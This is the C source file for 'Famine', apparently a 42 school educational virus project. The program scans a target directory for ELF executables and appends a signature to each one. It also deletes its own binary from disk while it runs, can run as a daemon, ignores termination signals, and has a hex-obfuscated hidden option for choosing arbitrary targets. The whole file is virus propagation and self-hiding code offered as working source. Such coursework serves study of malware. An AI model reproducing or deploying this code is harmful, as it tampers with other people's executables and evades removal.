/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
/*   Updated: 2024/07/26 19:42:58 by mgama            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include <stdio.h>

struct s_famine g_famine;
int g_exit = 0;

void remove_shm(void)
{
    shmctl(shmget(SHM_KEY, sizeof(int), 0666), IPC_RMID, NULL);
}

int is_running(void)
{
	/**
	 * Try to create a shared memory segment with the key SHM_KEY, if it fails
	 * this means that the program is already running.
	 */
	int shmid = shmget(SHM_KEY, sizeof(int), IPC_CREAT | IPC_EXCL | 0666);
	if (shmid == -1) {
		return 1;
	}
	return 0;
}

int	write_back_prog(void)
{
	/**
	 * When the program is done, write it back to the filesystem
	 */
	int fd = open(g_famine.name, O_CREAT | O_WRONLY, 0755);
	if (fd < 0)
		return (0);
	write(fd, (char *)g_famine.me, g_famine.len);
	close(fd);
	munmap(g_famine.me, g_famine.len);
	return (0);
}

void interruptHandler(int sig)
{
	(void)sig;
	g_exit = 1;
}

void famine(char *name, char *path)
{
	struct stat statbuf;

	const char elf_magic[] = {0x7f, 'E', 'L', 'F'};
	const char signature[] = FM_SIGNATURE;
	const size_t elf_magic_size = sizeof(elf_magic);

	char full_path[PATH_MAX + 1 + PATH_MAX];
	bzero(full_path, PATH_MAX + 1 + PATH_MAX);
	if (path != NULL)
	{
		strcpy(full_path, path);
		strcat(full_path, "/");
	}
	strcat(full_path, name);
	if (lstat(full_path, &statbuf) == -1)
		return ;
    if (S_ISLNK(statbuf.st_mode))
		return ;

	int fd = open(full_path, O_RDWR);
	if (fd == -1)
		return ;
	char buf[elf_magic_size];
	size_t n = read(fd, buf, elf_magic_size);
	// check if read has an error or if the number of byte if less than `elf_magic_size`
	if (n <= 0 || n < elf_magic_size)
		return ;

	if (strncmp(buf, elf_magic, elf_magic_size) != 0)
	{
		close(fd);
		return ;
	}

	char sign_buf[sizeof(signature)];

	size_t pos = lseek(fd, 0, SEEK_END);
	lseek(fd, pos - sizeof(signature), SEEK_SET);
	// check if read has an error or if the number of byte if less than `sizeof(signature)`
	n = read(fd, sign_buf, sizeof(signature));
	if (n <= 0 || n < sizeof(signature))
		return ;

	size_t i = 0;
	while (signature[i] == sign_buf[i] && i < sizeof(signature))
		i++;

	if (i == sizeof(signature))
	{
		close(fd);
		return ;
	}

	lseek(fd, pos, SEEK_SET);
	write(fd, signature, sizeof(signature));
}

void	custom_target(char *target)
{
	struct stat statbuf;
	DIR *dir;

	if (target == NULL)
		return;

	if (lstat(target, &statbuf) == -1)
		return;
	if (S_ISREG(statbuf.st_mode))
	{
		famine(target, NULL);
		return;
	}
	dir = opendir(target);
	if (!dir)
		return;
	for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
	{
		famine(d->d_name, target);
	}
	closedir(dir);
}

int main(int argc, char **argv)
{
	const char no_xsec[] = "\x69\x6B\x6E\x6F\x77\x77\x68\x61\x74\x69\x61\x6D\x64\x6F\x69\x6E\x67";
	DIR *dir;
	struct dirent *d;
	struct stat stats;
	int ch, option = 0;
	char *target = NULL;

	struct getopt_list_s optlist[] = {
        {"daemon", 'd', OPTPARSE_NONE},
        {"once", 'o', OPTPARSE_NONE},
        {"multi-instances", 'm', OPTPARSE_NONE},
        {no_xsec, 0, OPTPARSE_REQUIRED},
        {0}
    };
	struct getopt_s options;

    ft_getopt_init(&options, argv);
	while ((ch = ft_getopt(&options, optlist, NULL)) != -1) {
		switch (ch) {
			case 0:
				option |= F_CUSTOM;
				target = options.optarg;
				break;
			case 'd':
				option |= F_DAEMON;
				break;
			case 'o':
				option |= F_ONCE;
				break;
			case 'm':
				option |= F_MINSTANCE;
				break;
			default:
				exit(0);
		}
	}

	if (argc - options.optind != 0)
		return 0;

	if (0 == (option & F_MINSTANCE) && is_running())
	{
		return 0;
	}

	int fd = open(argv[0], O_RDONLY);
	if (fd < 0)
		return 0;

	if (fstat(fd, &stats) < 0)
		return 0;

	g_famine.name = argv[0];
	g_famine.len = stats.st_size;
	/**
	 * Copy the binary into a shared memory segment to save it and remove it from the filesystem
	 * to remove it on runtime.
	 */
	g_famine.me = mmap(NULL, g_famine.len, PROT_READ, MAP_PRIVATE, fd, 0);
	close(fd);
	if (g_famine.me == NULL)
		return (write_back_prog());

	if (unlink(argv[0]) < 0)
		return (write_back_prog());

	/**
	 * Daemonize the process if the option is set
	 */
	if (option & F_DAEMON)
	{
		/**
		 * BD_NO_CHDIR: Don't change the current working directory to the root directory
		 * BD_NO_REOPEN_STD_FDS: Don't reopen stdin, stdout, and stderr to /dev/null
		 */
		become_daemon(BD_NO_CHDIR | BD_NO_REOPEN_STD_FDS);
	}

	/**
	 * Register the function to be called at normal process termination
	 * Must be after daemonization to be effictive on the running process
	 */
	atexit(remove_shm);

	/**
	 * Catch kill signals to prevent segfaults.
	 */
	signal(SIGINT, interruptHandler);
	signal(SIGQUIT, interruptHandler);
	signal(SIGTERM, interruptHandler);
	signal(SIGSEGV, interruptHandler);

	do
	{
		if (option & F_CUSTOM)
		{
			if (FM_SECURITY == 0)
				break;
			custom_target(target);
		}
		else
		{
			dir = opendir(FM_TARGET);
			if (!dir)
				break;

			while ((d = readdir(dir)) != NULL)
				famine(d->d_name, FM_TARGET);
		
			closedir(dir);
		}

		if (option & F_ONCE)
			break;

		sleep(10);
	} while(!g_exit);

	return (write_back_prog());
}
